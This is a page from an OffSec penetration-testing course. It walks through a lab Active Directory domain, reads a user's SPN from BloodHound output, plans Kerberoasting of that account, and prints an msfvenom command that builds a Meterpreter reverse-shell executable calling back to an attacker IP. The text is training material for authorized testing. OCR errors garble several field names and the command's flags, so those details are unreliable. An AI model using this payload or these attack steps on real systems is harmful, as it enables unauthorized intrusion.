# OffSec

Penetration Testing with Kali Linux

Search for a node

| Database Info | Node Info | Analysis |
| --- | --- | --- |
| Password Never Expires | | True |
| Cannot Be Delegate | | False |
| ASREP Roastable | | False |
| Service Principal Names | http://internalsrv1.beyond.com | 

# EXTRA PROPERTIES

| | |
| --- | --- |
| distinguished name | CN=DANIELA MONROE,CN=USERS,DC=BEYOND,DC=COM |
| domain | BEYOND.COM |
| domainid | S-1-5-21-110408434-29315547075-2081307249 |
| password dnotreed | False |
| samaccco | daniela |

Figure 300: SPN of the user account daniela

Figure 300 shows the mapped SPN http://internalsrv1.beyond.com. Based on this, we can assume that a web server is running on INTERNALSRV1. Once we performed Kerberoasting and potentially obtained the plaintext password for daniela, we may use it to access INTERNALSRV1.

However, as we have stated before, finding an actionable vector should not interrupt our enumeration process. We collect all information, prioritize it, and then perform potential attacks.

Therefore, let's use a SOCKS proxy to perform network enumeration via Nmap and CrackMapExp in order to identify accessible services, open ports, and SMB methods.

First, we will create a staged Metpreter TCP release as an executable file using msfvenom. Since we can reuse the binary throughout the domain, we will store it in /home/kali/beyond.

```
kali@beyond msfvenom -p windows/x64/meterpreter/reverse-tcp
LHOST=192.168.119.55 PORT=4443 -f exe -o met.exe
```

[ No platform was selected, choosing Msf::Module::Windows from the payload

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 844